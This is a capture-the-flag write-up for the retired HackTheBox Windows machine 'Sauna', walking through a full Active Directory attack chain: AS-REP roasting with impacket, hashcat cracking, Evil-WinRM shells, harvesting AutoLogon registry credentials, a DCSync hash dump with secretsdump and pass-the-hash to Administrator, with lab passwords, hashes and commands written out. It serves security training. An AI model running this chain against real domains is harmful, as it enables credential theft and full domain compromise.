# Sauna — HackTheBox

| Field | Detail |
|---|---|
| OS | Windows |
| Difficulty | Easy |
| Active Directory | Yes |
| IP | 10.129.35.227 |
| Domain | EGOTISTICAL-BANK.LOCAL |
| DC | EGOTISTICAL-BANK |
| User flag | ✓ |
| Root flag | ✓ |
| Retired | Yes |
| Site writeup | [jostif.pages.dev/writeups/sauna](https://jostif.pages.dev/writeups/sauna) |

**Techniques:** OSINT (employee names) → username generation → AS-REP Roasting → hashcat → WinPEAS → AutoLogon registry creds → DCSync (GetChangesAll) → Pass-the-Hash → Administrator

---

---

## Overview

Sauna is a beginner-friendly Active Directory machine on HackTheBox. It teaches a classic AD attack chain that appears frequently in real-world penetration tests:

1. Harvest employee names from a public website
2. Generate possible AD usernames from those names
3. AS-REP Roast a user who has Kerberos pre-authentication disabled
4. Crack the hash offline to get a password
5. Find plaintext credentials stored insecurely in the Windows registry
6. Use those credentials to perform a DCSync attack and dump all domain hashes
7. Pass-the-Hash as Administrator to fully compromise the domain

Each step teaches a real technique. Let's go through it from the beginning.

---

## Table of Contents

1. Reconnaissance — Nmap
2. Web Enumeration — Harvesting Employee Names
3. Username Generation — username-anarchy
4. AS-REP Roasting — GetNPUsers
5. Hash Cracking — Hashcat
6. Foothold — Evil-WinRM as fsmith
7. Post-Exploitation — WinPEAS & AutoLogon Creds
8. Privilege Escalation — DCSync with svc_loanmgr
9. Domain Compromise — Pass-the-Hash as Administrator

---

## 1. Reconnaissance — Nmap

The first step in any penetration test is to find out what services are running on the target. We use **nmap**, the industry-standard network scanner.

```bash
nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.35.227
```

**Flag breakdown:**
- `-sC` — run default scripts (grabs banners, checks for common misconfigs)
- `-sV` — detect service versions
- `-p-` — scan all 65535 ports, not just the top 1000
- `--min-rate 5000` — send at least 5000 packets/sec (faster scan)
- `-oN` — save output to a file

### Key Results

```
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                             (Domain: EGOTISTICAL-BANK.LOCAL)
445/tcp  open  microsoft-ds
5985/tcp open  http          Microsoft HTTPAPI (WinRM)
```

### What This Tells Us

This is a **Domain Controller**. How do we know?
- Port **88** (Kerberos) — only DCs run Kerberos
- Port **389** (LDAP) — Active Directory LDAP
- Port **53** (DNS) — DCs act as DNS servers
- The LDAP banner reveals the domain: `EGOTISTICAL-BANK.LOCAL`

Port **5985** (WinRM) is also open — this means if we get valid credentials, we can get a remote shell using Evil-WinRM.

Port **80** means there's a website — let's look at it.

> **Note:** nmap also shows a clock skew of 7 hours. This matters for Kerberos (which requires clocks to be within 5 minutes) — but since we're doing AS-REP roasting from Kali rather than requesting tickets manually, it won't affect us here.

---

## 2. Web Enumeration — Harvesting Employee Names

We browse to `http://10.129.35.227` and find the website for **Egotistical Bank**. On the **About** page, the company lists its team members with full names:

```
Fergus Smith
Shaun Coins
Sophie Driver
Bowie Taylor
Hugo Bear
Steven Kerb
```

### Why Does This Matter?

Active Directory usernames are almost always derived from real names. Common formats include:
- `fsmith` (first initial + last name)
- `fergus.smith`
- `fergussmith`
- `f.smith`

If we can generate all the likely username formats for each name, we can check which ones actually exist in AD — without triggering lockouts, because we're using Kerberos pre-auth probing (AS-REP roasting), not password guessing.

We save these names to a file:

```bash
cat team.txt
fergus smith
shaun coins
sophie driver
bowie taylor
hugo bear
steven kerb
```

---

## 3. Username Generation — username-anarchy

**username-anarchy** is a tool that takes real names and generates every common username format from them automatically.

```bash
cd ~/tools/username-anarchy
./username-anarchy --input-file ~/Training/HTB/Sauna/team.txt > ~/Training/HTB/Sauna/usernames.txt
```

This produces dozens of username candidates per person — `fsmith`, `fergus.smith`, `smithf`, etc. We now have a wordlist of potential AD usernames to test.

---

## 4. AS-REP Roasting — GetNPUsers

### What is AS-REP Roasting?

Normally, when you ask a Domain Controller for a Kerberos ticket (a TGT), it requires you to prove your identity first — this is called **pre-authentication**. You send an encrypted timestamp using your password hash, and only if it's correct does the DC issue a ticket.

However, some accounts have pre-authentication **disabled**. This is a misconfiguration. When pre-auth is disabled, anyone can ask the DC for that user's TGT without knowing their password. The DC helpfully responds with a ticket encrypted with the user's password hash.

We can then take that encrypted blob offline and crack it with hashcat — no lockout risk, no network noise.

This attack is called **AS-REP Roasting** (AS-REP is the name of the Kerberos response message).

### Running the Attack

We first set environment variables to keep commands clean:

```bash
export IP=10.129.35.227
export DOMAIN=EGOTISTICAL-BANK.LOCAL
```

Then we use **impacket-GetNPUsers** to test all our generated usernames:

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -dc-ip $IP -no-pass -usersfile usernames.txt
```

**Flag breakdown:**
- `EGOTISTICAL-BANK.LOCAL/` — domain to target
- `-dc-ip $IP` — address of the Domain Controller
- `-no-pass` — we don't have a password, we're probing anonymously
- `-usersfile usernames.txt` — test each username from our list

### Output

```
[-] KDC_ERR_C_PRINCIPAL_UNKNOWN — username doesn't exist
[-] KDC_ERR_C_PRINCIPAL_UNKNOWN — username doesn't exist
...
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:fe7f2dbf...  ← HASH CAPTURED!
...
[-] KDC_ERR_C_PRINCIPAL_UNKNOWN — username doesn't exist
```

**fsmith** (Fergus Smith) has pre-authentication disabled. We captured his AS-REP hash. We save it to a file called `hash`.

---

## 5. Hash Cracking — Hashcat

Now we crack the hash offline. The hash type is **Kerberos 5 AS-REP** which is hashcat mode **18200**.

```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

**Flag breakdown:**
- `-m 18200` — hash type: Kerberos AS-REP
- `hash` — our captured hash file
- `rockyou.txt` — the most common password wordlist (14 million passwords)

### Result

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
```

**fsmith's password is `Thestrokes23`.**

To see already-cracked results without re-running:
```bash
hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt --show
```

---

## 6. Foothold — Evil-WinRM as fsmith

We confirmed earlier that port 5985 (WinRM) is open. WinRM is Windows Remote Management — it lets admins manage Windows machines remotely via PowerShell. **Evil-WinRM** is a tool that lets us use this to get an interactive shell.

```bash
evil-winrm -i $IP -u fsmith -p 'Thestrokes23'
```

```
*Evil-WinRM* PS C:\Users\FSmith\Documents>
```

We're in! Now grab the user flag:

```powershell
cat ../Desktop/user.txt
# 5552b074550a4ec23624057c9c24c97e
```

**User flag captured.**

---

## 7. Post-Exploitation — WinPEAS & AutoLogon Credentials

We have a foothold but fsmith is a regular user. We need to escalate privileges to Administrator or Domain Admin. The next step is **enumeration** — find out everything about this machine.

**WinPEAS** (Windows Privilege Escalation Awesome Script) automates this. It checks hundreds of misconfigurations, stored credentials, vulnerable services, and more.

### Uploading WinPEAS

We upload the executable from our Kali machine using Evil-WinRM's built-in upload feature:

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> upload /home/kali/Training/HTB/Sauna/winPEASany.exe winp.exe
```

> **Note:** Evil-WinRM upload syntax is `upload <local path> <remote path>`. The `download` command works in reverse.

### Running WinPEAS

```powershell
*Evil-WinRM* PS C:\Users\FSmith\Documents> ./winp.exe
```

### Key Finding — AutoLogon Credentials

WinPEAS finds something critical in the Windows registry:

```
Looking for AutoLogon credentials
    DefaultDomainName  : EGOTISTICALBANK
    DefaultUserName    : EGOTISTICALBANK\svc_loanmanager
    DefaultPassword    : Moneymakestheworldgoround!
```

### What is AutoLogon?

Windows has a feature that lets a machine automatically log in as a specific user on boot — useful for kiosks and service accounts. The username and **plaintext password** are stored in the registry at:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

This is a well-known insecure practice. Attackers (and WinPEAS) always check here.

### Testing the Credentials

Notice the username in the registry is `svc_loanmanager` but the actual AD account is `svc_loanmgr` — a common discrepancy. We test both:

```bash
# Wrong username (from registry)
nxc smb $IP -u 'svc_loanmanager' -p 'Moneymakestheworldgoround!'
# [-] STATUS_LOGON_FAILURE

# Correct AD username
nxc smb $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
# [+] EGOTISTICAL-BANK.LOCAL\svc_loanmgr:Moneymakestheworldgoround!

# Check WinRM access
nxc winrm $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
# [+] ... (Pwn3d!)
```

`svc_loanmgr` has WinRM access. We get a shell:

```bash
evil-winrm -i $IP -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!'
```

---

## 8. BloodHound — Understanding the Attack Path

Before escalating, we run **BloodHound** to map the entire AD environment and visualize attack paths. BloodHound is an essential AD pentesting tool.

```bash
bloodhound-python -u 'svc_loanmgr' -p 'Moneymakestheworldgoround!' \
  -d $DOMAIN -ns $IP -c All --zip
```

BloodHound reveals that **svc_loanmgr has GetChangesAll over the domain**.

### What Does GetChangesAll Mean?

`GetChangesAll` (also called `DS-Replication-Get-Changes-All`) is an AD permission that allows a user to replicate **all** directory data from a Domain Controller — including password hashes.

This is the permission that Domain Controllers use to sync with each other (replication). If a regular user account has it, they can impersonate a DC and pull every user's password hash from the domain. This is called a **DCSync attack**.

---

## 9. DCSync — Dumping All Domain Hashes

We use **impacket-secretsdump** to perform the DCSync attack remotely from Kali — no need to be on the machine:

```bash
impacket-secretsdump 'EGOTISTICAL-BANK.LOCAL'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.129.35.227'
```

### Output

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:...
krbtgt:502:...
HSmith:1103:...
FSmith:1105:...
svc_loanmgr:1108:...
```

The format is `username:RID:LM_hash:NT_hash:::`. The part we care about is the **NT hash** (last hash before the `:::`).

**Administrator's NT hash: `823452073d75b9d1cf70ebdf86c7f98e`**

---

## 10. Domain Compromise — Pass-the-Hash as Administrator

We don't need to crack the Administrator hash. In Windows environments, you can authenticate using just the NTLM hash — this is called **Pass-the-Hash (PtH)**. The hash IS the credential.

### Verify the Hash Works

```bash
nxc smb $IP -u 'administrator' -H '823452073d75b9d1cf70ebdf86c7f98e'
# [+] EGOTISTICAL-BANK.LOCAL\administrator:823452073d75b9d1cf70ebdf86c7f98e (Pwn3d!)
```

### Get a Shell

```bash
evil-winrm -i $IP -u administrator -H '823452073d75b9d1cf70ebdf86c7f98e'
```

```
*Evil-WinRM* PS C:\Users\Administrator>
```

### Root Flag

```powershell
cd Desktop
cat root.txt
# 01d83bce08bb49c3d8a63bd61033751a
```

**Domain fully compromised.**

---

## Attack Chain Summary

```
[Website] Employee names
    ↓ username-anarchy
[Username list] fsmith, hsmith, etc.
    ↓ GetNPUsers (AS-REP Roasting)
[Kerberos Hash] $krb5asrep$23$fsmith@...
    ↓ hashcat -m 18200
[Credentials] fsmith:Thestrokes23
    ↓ Evil-WinRM
[Shell] fsmith — User Flag ✓
    ↓ WinPEAS → AutoLogon registry key
[Credentials] svc_loanmgr:Moneymakestheworldgoround!
    ↓ BloodHound → GetChangesAll → DCSync
[All NTLM Hashes] Administrator:823452073d75b9d1cf70ebdf86c7f98e
    ↓ Pass-the-Hash
[Shell] Administrator — Root Flag ✓
```

---

## Key Lessons

| Lesson | Takeaway |
|--------|----------|
| OSINT matters | Public employee names → valid AD usernames |
| Pre-auth disabled = offline crackable hash | No lockout, no noise |
| Registry stores plaintext creds | Always run WinPEAS/winPEAS |
| DCSync = full domain compromise | GetChangesAll is a critical misconfiguration |
| PtH works without cracking | NTLM hashes are usable credentials |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and service detection |
| username-anarchy | Generate AD username candidates from names |
| kerbrute | Validate usernames against Kerberos |
| impacket-GetNPUsers | AS-REP Roasting |
| hashcat | Offline hash cracking |
| Evil-WinRM | Remote shell via WinRM |
| WinPEAS | Windows privilege escalation enumeration |
| NetExec (nxc) | SMB/WinRM credential validation |
| BloodHound + bloodhound-python | AD attack path mapping |
| impacket-secretsdump | DCSync — dump domain hashes |

---

*Machine: Sauna | Difficulty: Easy | Author: J0stif*
